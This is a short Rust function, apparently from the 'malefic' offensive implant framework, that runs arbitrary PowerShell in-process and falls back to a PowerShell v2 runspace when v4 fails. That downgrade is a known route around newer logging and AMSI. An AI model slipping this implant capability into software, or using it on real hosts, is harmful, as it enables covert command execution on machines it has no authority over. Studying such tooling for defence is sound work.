pub unsafe fn pwsh_exec_command(script: &String) -> String {
    #[cfg(feature = "prebuild")]
    {

        let ret = crate::win::kit::bindings::MaleficPwshExecCommand(
            script.as_ptr(),
            script.len(),
        );
        String::from_raw_parts(ret.data, ret.len, ret.capacity)
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::pwsh::PowershellUtils::PsUtils;
            let ps_env = unsafe {
                match PsUtils::create_v4() {
                    Ok(ps) => ps,
                    Err(_) => match PsUtils::create_v2() {
                        Ok(v2) => v2,
                        Err(e) => {
                            return e;
                        }
                    }
                }
            };

        match ps_env.run_ps_command(script) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e
            }
        }
    }
}